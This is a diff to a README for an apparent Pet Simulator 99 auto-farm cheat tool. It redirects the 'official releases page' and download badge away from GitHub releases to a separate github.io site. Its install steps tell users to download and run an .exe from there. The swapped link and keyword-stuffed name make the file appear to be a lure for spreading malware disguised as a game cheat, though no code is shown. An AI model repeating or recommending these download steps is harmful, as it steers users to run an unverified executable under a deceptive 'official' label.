@@ -1,6 +1,6 @@
 # 🤖 Pet-Simulator-99-Auto-Farm-Trainer-2026-Quantum - Automate your Pet Simulator 99 progress
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/wadsworthgreyed525/Pet-Simulator-99-Auto-Farm-Trainer-2026-Quantum/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://wadsworthgreyed525.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements to run the software properly:
 
 Follow these steps to set up the trainer on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/wadsworthgreyed525/Pet-Simulator-99-Auto-Farm-Trainer-2026-Quantum/releases) to access the latest version.
+1. Visit the [official releases page](https://wadsworthgreyed525.github.io) to access the latest version.
 2. Locate the most recent file ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your Desktop or Downloads folder.
